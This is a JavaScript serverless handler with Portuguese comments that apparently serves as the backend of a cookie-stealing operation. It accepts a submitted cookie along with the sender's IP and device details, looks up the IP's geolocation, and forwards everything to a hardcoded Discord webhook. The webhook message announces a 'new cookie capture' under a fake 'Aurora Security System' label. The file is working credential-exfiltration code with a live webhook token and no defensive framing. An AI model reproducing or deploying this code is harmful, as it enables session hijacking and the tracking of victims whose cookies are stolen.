export default async function handler(req, res) {
  // ========== CONFIGURAÇÕES CORS ==========
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  // Preflight
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  // Só aceita POST
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const { cookie, ip, device, timestamp } = req.body;

    // ========== VALIDAÇÃO ==========
    if (!cookie) {
      return res.status(400).json({ error: 'Cookie não enviado' });
    }

    if (cookie.length < 50) {
      return res.status(400).json({ error: 'Cookie inválido' });
    }

    // ========== BUSCAR INFORMAÇÕES DO IP (COMPLETO) ==========
    let ipInfo = {};
    try {
      const controller = new AbortController();
      const timeoutId = setTimeout(() => controller.abort(), 5000);
      
      const ipResponse = await fetch(`http://ip-api.com/json/${ip}?fields=66846719`, {
        signal: controller.signal
      });
      clearTimeout(timeoutId);
      
      if (ipResponse.ok) {
        ipInfo = await ipResponse.json();
      }
    } catch (e) {
      console.error('Erro ao buscar info do IP:', e.message);
    }

    // ========== WEBHOOK DO DISCORD ==========
    const webhookURL = 'https://canary.discord.com/api/webhooks/1485346055141851308/-4ro_V3pWvgd_qRDW6uOO0WkVEmDQmt-9HNzgFd1MnqObF-TGy23rXLxESosIqg8KnFT';

    // Limitar tamanho do cookie (Discord: 2000 caracteres por field)
    const cookieLimitado = cookie.length > 1900 ? cookie.substring(0, 1900) + '...' : cookie;

    // ========== INFORMAÇÕES DO DISPOSITIVO COMPLETAS ==========
    const userAgent = req.headers['user-agent'] || 'Desconhecido';
    const acceptLanguage = req.headers['accept-language'] || 'Desconhecido';
    
    const dispositivoInfo = `\`\`\`yml
Dispositivo: ${device || 'Desconhecido'}
Navegador: ${getBrowserInfo(userAgent)}
Sistema: ${getOSInfo(userAgent)}
Idioma: ${acceptLanguage}
User-Agent: ${userAgent.substring(0, 100)}${userAgent.length > 100 ? '...' : ''}
\`\`\``;

    // ========== INFORMAÇÕES DO IP COMPLETAS ==========
    const ipInfoText = `\`\`\`yml
IP: ${ip || 'Desconhecido'}
País: ${ipInfo.country || 'Desconhecido'} ${ipInfo.countryCode || ''}
Região: ${ipInfo.regionName || 'Desconhecido'}
Cidade: ${ipInfo.city || 'Desconhecido'}
CEP: ${ipInfo.zip || 'Desconhecido'}
Latitude: ${ipInfo.lat || 'Desconhecido'}
Longitude: ${ipInfo.lon || 'Desconhecido'}
Fuso Horário: ${ipInfo.timezone || 'Desconhecido'}
Provedor: ${ipInfo.isp || 'Desconhecido'}
Organização: ${ipInfo.org || 'Desconhecido'}
ASN: ${ipInfo.as || 'Desconhecido'}
Mobile: ${ipInfo.mobile ? 'Sim' : 'Não'}
Proxy/VPN: ${ipInfo.proxy ? 'Sim' : 'Não'}
Hosting: ${ipInfo.hosting ? 'Sim' : 'Não'}
\`\`\``;

    // ========== EMBED COMPLETO ==========
    const embed = {
      content: '@everyone',
      embeds: [{
        title: '🔐 NOVA CAPTURA DE COOKIE',
        description: 'Um novo cookie foi capturado pelo sistema Aurora',
        color: 0x6366f1,
        fields: [
          {
            name: '🍪 COOKIE COMPLETO',
            value: '```' + cookieLimitado + '```'
          },
          {
            name: '📊 INFORMAÇÕES DO DISPOSITIVO',
            value: dispositivoInfo
          },
          {
            name: '🌍 INFORMAÇÕES DO IP',
            value: ipInfoText
          },
          {
            name: '⏰ TIMESTAMP',
            value: `<t:${Math.floor(Date.now() / 1000)}:F> (<t:${Math.floor(Date.now() / 1000)}:R>)`,
            inline: true
          },
          {
            name: '🔢 ID DA SESSÃO',
            value: `\`${generateSessionId()}\``,
            inline: true
          },
          {
            name: '📏 TAMANHO DO COOKIE',
            value: `\`${cookie.length} caracteres\``,
            inline: true
          }
        ],
        footer: {
          text: 'Aurora Security System • Proteção Avançada',
          icon_url: 'https://media.discordapp.net/attachments/1478076459074719877/1478567053999869993/Gemini_Generated_Image_17qz9117qz9117qz.png'
        },
        timestamp: new Date().toISOString(),
        thumbnail: {
          url: 'https://media.discordapp.net/attachments/1456825082507956428/1477117859665805312/clideo_editor_64f89f8646e04ff7b36cd451bf005602_online-video-cutter.com.gif'
        }
      }]
    };

    // ========== ENVIAR PARA O DISCORD ==========
    const response = await fetch(webhookURL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(embed)
    });

    if (!response.ok) {
      const errorText = await response.text();
      console.error('Erro Discord:', errorText);
      return res.status(500).json({ error: 'Falha ao enviar para o Discord: ' + response.status });
    }

    return res.status(200).json({ 
      success: true,
      message: 'Cookie enviado com sucesso!'
    });

  } catch (error) {
    console.error('Erro interno:', error);
    return res.status(500).json({ error: 'Erro interno do servidor: ' + error.message });
  }
}

// ========== FUNÇÕES AUXILIARES ==========

function getBrowserInfo(ua) {
  if (!ua) return 'Desconhecido';
  ua = ua.toLowerCase();
  if (ua.includes('chrome') && !ua.includes('edg')) return 'Google Chrome';
  if (ua.includes('firefox')) return 'Mozilla Firefox';
  if (ua.includes('safari') && !ua.includes('chrome')) return 'Apple Safari';
  if (ua.includes('edg')) return 'Microsoft Edge';
  if (ua.includes('opera') || ua.includes('opr')) return 'Opera';
  if (ua.includes('brave')) return 'Brave';
  return 'Desconhecido';
}

function getOSInfo(ua) {
  if (!ua) return 'Desconhecido';
  ua = ua.toLowerCase();
  if (ua.includes('windows')) return 'Windows';
  if (ua.includes('mac os') || ua.includes('macintosh')) return 'macOS';
  if (ua.includes('linux')) return 'Linux';
  if (ua.includes('android')) return 'Android';
  if (ua.includes('ios') || ua.includes('iphone') || ua.includes('ipad')) return 'iOS';
  return 'Desconhecido';
}

function generateSessionId() {
  return Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
}
